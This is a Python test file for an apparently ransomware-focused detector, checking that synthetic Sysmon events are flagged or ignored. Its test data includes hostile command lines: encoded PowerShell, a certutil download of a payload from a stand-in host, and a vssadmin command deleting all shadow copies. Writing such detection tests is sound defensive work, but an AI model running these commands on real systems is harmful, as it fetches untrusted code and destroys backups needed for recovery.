from ransomeye.behavior import (
    analyze_behavior,
    detect_recovery_inhibition,
    detect_suspicious_powershell,
)


def make_event(process_name, command_line, event_id="event-1"):
    return {
        "event_id": event_id,
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": process_name,
        "pid": "4532",
        "command_line": command_line,
    }


def test_detects_encoded_powershell():
    event = make_event(
        "powershell.exe",
        "powershell.exe -EncodedCommand SGVsbG8=",
    )

    findings = detect_suspicious_powershell([event])

    assert len(findings) == 1
    assert findings[0]["type"] == "suspicious_powershell"
    assert findings[0]["score"] == 10
    assert findings[0]["technique"] == "T1059.001"


def test_detects_certutil_download():
    event = make_event(
        "certutil.exe",
        "certutil.exe -urlcache -split -f https://example.invalid/payload.exe",
    )

    findings = analyze_behavior([event])

    assert len(findings) == 1
    assert findings[0]["type"] == "suspicious_certutil"
    assert findings[0]["score"] > 0
    assert findings[0]["technique"] == "T1105"


def test_detects_recovery_inhibition():
    event = make_event(
        "vssadmin.exe",
        "vssadmin delete shadows /all /quiet",
    )

    findings = detect_recovery_inhibition([event])

    assert len(findings) == 1
    assert findings[0]["type"] == "recovery_inhibition"
    assert findings[0]["score"] == 15
    assert findings[0]["technique"] == "T1490"


def test_benign_powershell_does_not_trigger():
    event = make_event(
        "powershell.exe",
        "powershell.exe Get-Date",
    )

    findings = analyze_behavior([event])

    assert findings == []


def test_benign_certutil_does_not_trigger():
    event = make_event(
        "certutil.exe",
        "certutil.exe -dump certificate.cer",
    )

    findings = analyze_behavior([event])

    assert findings == []
